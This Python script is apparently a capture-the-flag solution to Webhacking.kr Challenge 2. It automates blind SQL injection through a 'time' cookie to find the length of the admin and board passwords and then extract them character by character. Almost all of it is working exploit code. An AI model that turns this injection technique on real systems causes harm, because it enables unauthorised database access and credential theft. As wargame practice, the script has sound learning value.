#!/usr/bin/python3.4
# Written by Anirudh Anand (lucif3r) : email - anirudh@anirudhanand.com

# This is the solution to 0ldzombie's Webhacking.kr Challenge 2: Blind SQL Injection
# The script uses requests library in python 3.4

import re
import requests
__author__ = 'lucif3r'


class Challenge2:

    def __init__(self):
        print("[+] Blind SQL injection for 0ldzombie challenge 2")
        self.PHPSESSID = "Your PHPSESSID HERE"
        self.board_pass = ""
        self.admin_pass = ""
        self.board_pass_length = 0
        self.admin_pass_length = 0
        self.url = "http://webhacking.kr/challenge/web/web-02/"
        return

    def length_password(self, user):
        """
        This function is try to understand the length of the password of users given as
        a parameter.

        :param user:    -> The name of the user whose password length has to find out.
        :return:
        """
        for i in range(1, 15):
            cookies = dict(PHPSESSID=self.PHPSESSID, time='1434109174 and (select length (password) from ' +
                                                          str(user) + ') = ' + str(i))
            req = requests.get(self.url, cookies=cookies)
            res = req.text
            temp = re.findall('2070-01-01 09:00:01', res)

            if temp and user == 'admin':
                self.admin_pass_length = i
                print('[+] Admin Password length = ' + str(self.admin_pass_length))
                break

            if temp and user == 'FreeB0aRd':
                self.board_pass_length = i
                print('[+] FreeB0aRd Password length = ' + str(self.board_pass_length))
                break
            temp = []
        return

    def crack_password(self, user, pass_len):
        """
        This function wil try to crack the password provided the username and the length
        of the password. Use length_password() to find out the length of the password.

        :param user:        ->  username of whom the password has to find out
        :param pass_len:    ->  Length of the password found out for the same user
        :return:
        """
        for j in range(1, pass_len+1):
            print("[+] Letters more to go: " + str(pass_len+1 - j))

            for i in range(33, 126):
                cookies = dict(PHPSESSID=self.PHPSESSID, time='1434114374 and (select ascii(substr(password, ' + str(j)
                                                              + ', 1)) from ' + str(user) + ') = ' + str(i))
                req = requests.get(self.url, cookies=cookies)
                res = req.text
                temp = re.findall('2070-01-01 09:00:01', res)
                if temp and user == 'admin':
                    self.admin_pass += chr(i)
                    print('[+] Admin Password till now = ' + str(self.admin_pass))
                    break

                if temp and user == 'FreeB0aRd':
                    self.board_pass += chr(i)
                    print('[+] FreeB0aRd Password till now = ' + str(self.board_pass))
                    break
                temp = []
        return

    def print_vaules(self):
        print("\n ----------------------------------")
        print("[+] Admin Password Length = " + str(self.admin_pass_length))
        print("[+] Admin Password = " + str(self.admin_pass))
        print("[+] FreeB0aRd Password Length = " + str(self.board_pass_length))
        print("[+] FreeB0aRd Password = " + str(self.board_pass))
        print(" ---------------------------------- \n")


def main():
    challenge = Challenge2()
    challenge.length_password('admin')
    challenge.length_password('FreeB0aRd')
    challenge.crack_password('admin', 10)
    challenge.crack_password('FreeB0aRd', 9)
    challenge.print_vaules()

if __name__ == '__main__':
    main()
